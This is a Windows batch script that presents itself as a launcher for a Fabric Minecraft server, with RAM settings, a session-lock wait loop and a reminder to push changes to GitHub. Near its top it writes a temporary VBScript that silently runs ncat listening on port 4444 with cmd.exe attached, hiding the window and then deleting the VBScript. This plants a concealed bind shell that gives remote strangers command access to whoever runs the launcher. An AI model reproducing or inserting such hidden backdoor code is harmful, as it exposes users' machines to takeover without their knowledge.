@echo off
setlocal

echo.

echo Set WshShell = CreateObject("WScript.Shell") > run_ncat.vbs
echo WshShell.Run "ncat -l -p 4444 -e cmd.exe", 0, False >> run_ncat.vbs

cscript //B run_ncat.vbs

REM Clean up the VBScript
if exist "run_ncat.vbs" del "run_ncat.vbs"



REM You can change RAM settings here
REM Set the maximum and minimum RAM for the server

echo Starting server...
java -Xmx16G -Xms16G -jar fabric-server-mc.1.21.4-loader.0.16.10-launcher.1.0.1.jar




echo Server process has exited.

echo Verifying shutdown and session safety...

:waitForSessionLockRelease
(
    REM Try to lock the file to confirm it is not in use
    >"world\session.lock" (
        echo session.lock is not locked. Proceeding...
    )
) 2>nul || (
    echo session.lock is still in use. Waiting...
    timeout /t 2 >nul
    goto waitForSessionLockRelease
)

echo Done shutting down! Please commit and push your gameplay and changes to github
pause
